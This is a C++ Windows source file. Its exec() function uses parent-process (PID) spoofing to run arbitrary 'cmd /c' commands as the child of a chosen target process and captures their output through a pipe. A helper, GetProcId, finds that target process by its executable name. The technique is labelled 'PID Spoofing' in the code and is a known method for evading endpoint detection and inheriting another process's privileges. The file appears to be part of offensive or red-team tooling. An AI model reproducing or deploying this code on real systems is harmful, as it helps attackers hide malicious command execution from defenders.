#include "Exec.h"

int exec(DWORD dwPID, char* command)
{
	char binaryName[255];
	const char* envName = "COMSPEC";
	std::string sCommand = "";
	int iResult = 0;
	DWORD dwError = 0;

	STARTUPINFOEXA sInfo = { 0 };
	PROCESS_INFORMATION pInfo = { 0 };
	HANDLE hParentProc = INVALID_HANDLE_VALUE;
	size_t attrSize = 0;
	int ree = 0;

	SECURITY_ATTRIBUTES sAttr = { 0 };
	HANDLE hStdOutR = NULL;
	HANDLE hStdOutW = NULL;
	HANDLE hStdInR = NULL;
	HANDLE hStdInW = NULL;
	HANDLE hMyDuped = NULL;

	sAttr.nLength = sizeof(sAttr);
	sAttr.bInheritHandle = TRUE;
	sAttr.lpSecurityDescriptor = NULL;

	hParentProc = OpenProcess(MAXIMUM_ALLOWED, false, dwPID);
	if (INVALID_HANDLE_VALUE == hParentProc)
	{
		dwError = GetLastError();
		DERR(std::system_category().message(dwError).c_str(), dwError);
		return dwError;
	}

	if (!CreatePipe(&hStdOutR, &hStdOutW, NULL, 0))
	{
		dwError = GetLastError();
		DERR(std::system_category().message(dwError).c_str(), dwError);
		return dwError;
	}

	if (!DuplicateHandle(GetCurrentProcess(), hStdOutW, hParentProc, &hMyDuped, 0, TRUE, DUPLICATE_SAME_ACCESS))
	{
		dwError = GetLastError();
		DERR(std::system_category().message(dwError).c_str(), dwError);
		return dwError;
	}

	if (!SetHandleInformation(hStdOutR, HANDLE_FLAG_INHERIT, 0))
	{
		dwError = GetLastError();
		DERR(std::system_category().message(dwError).c_str(), dwError);
		return dwError;
	}

	/*ZeroMemory(&sAttr, sizeof(sAttr));
	sAttr.nLength = sizeof(sAttr);
	sAttr.bInheritHandle = TRUE;
	sAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&hStdInR, &hStdInW, NULL, 0))
	{
		dwError = GetLastError();
		DERR(std::system_category().message(dwError).c_str(), dwError);
		return dwError;
	}*/
	/*if (!SetHandleInformation(hStdInW, HANDLE_FLAG_INHERIT, 0))
	{
		dwError = GetLastError();
		DERR(std::system_category().message(dwError).c_str(), dwError);
		return dwError;
	}*/


	iResult = GetEnvironmentVariableA(envName, binaryName, 255);
	if (iResult <= 0)
	{
		dwError = GetLastError();
		DERR(std::system_category().message(dwError).c_str(), dwError);
		return dwError;
	}

	sCommand.append(binaryName);
	sCommand.append(" /c ");
	sCommand.append(command);


	////////////////////////////////////////////////////////////////////////////////////////////////
	/// PID Spoofing. //////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////////////////////////

	// Fucking stupid microsoft: "Note  This initial call will return an error by design. This is expected behavior."
	iResult = InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);

	sInfo.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
	if (!sInfo.lpAttributeList)
	{
		dwError = GetLastError();
		DERR(std::system_category().message(dwError).c_str(), dwError);
		return dwError;
	}

	iResult = InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, &attrSize);
	if (0 == iResult)
	{
		dwError = GetLastError();
		DERR(std::system_category().message(dwError).c_str(), dwError);
		return dwError;
	}

	iResult = UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProc, sizeof(hParentProc), NULL, NULL);
	if (0 == iResult)
	{
		dwError = GetLastError();
		DERR(std::system_category().message(dwError).c_str(), dwError);
		return dwError;
	}


	sInfo.StartupInfo.hStdOutput = hMyDuped;
	sInfo.StartupInfo.hStdError = hMyDuped;
	//sInfo.StartupInfo.hStdInput = hStdOutR;
	sInfo.StartupInfo.dwFlags |= STARTF_USESTDHANDLES;
	sInfo.StartupInfo.cb = sizeof(sInfo);
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/// End PID Spoofing. ////////////////////////////////////////////////////////////////////////////////////////////
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////


	if (!CreateProcessA(NULL, (LPSTR)sCommand.c_str(), NULL, NULL, TRUE, CREATE_NEW_CONSOLE | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &sInfo.StartupInfo, &pInfo))
	{
		dwError = GetLastError();
		DERR(std::system_category().message(dwError).c_str(), dwError);
		return dwError;
	}

	char buff[4096] = { 0 };
	DWORD dwRead = 0;
	DWORD dwToRead = 0;
	BOOL bSuccess = FALSE;


	// loop here
	WaitForSingleObject(pInfo.hProcess, INFINITE);

	PeekNamedPipe(hStdOutR, 0, 0, 0, &dwToRead, 0);

	while (dwToRead)
	{
		printf("Bytes: %d\n", dwToRead);
		bSuccess = ReadFile(hStdOutR, buff, sizeof(buff), &dwRead, NULL);
		printf("F: %s\n", buff);
		PeekNamedPipe(hStdOutR, 0, 0, 0, &dwToRead, 0);
	}


	CloseHandle(pInfo.hProcess);
	CloseHandle(pInfo.hThread);

	CloseHandle(hStdOutR);
	CloseHandle(hStdOutW);
	CloseHandle(hStdInR);
	CloseHandle(hStdInW);

	return 0;
}


DWORD GetProcId(const wchar_t* procName) {

	DWORD procId = 0;

	/* CreateToolhelp32Snapshot - Takes snapshot of specified processes.
	*  TH32CS_SNAPPROCESS - Include all processes in the system snapshot
	*/
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	// INVALID_HANDLE_VALUE - Error code for CreateToolhelp32Snapshot.
	if (hSnap != INVALID_HANDLE_VALUE) {

		// PROCESSENTRY32 - Describes entry in system process snapshot list (hSnap).
		PROCESSENTRY32 procEntry{};

		// Must set dwSize before calling Process32First.
		procEntry.dwSize = sizeof(procEntry);

		// Process32First - Retrieves information about frist process in system snapshot (hSnap).
		if (Process32First(hSnap, &procEntry)) {
			do {

				/* _wcsicmp - Lexicographical wide string case-insensitive compare.
				*  szExeFile - Name of executable file for the process.
				*/
				if (!_wcsicmp(procEntry.szExeFile, procName)) {

					// the32ProcessID - Process ID of process entry.
					procId = procEntry.th32ProcessID;
					break;
				}

				// Process32Next - Retrieves information about next process in system snapshot (hSnap).
			} while (Process32Next(hSnap, &procEntry));
		}
	}

	CloseHandle(hSnap);
	return procId;
}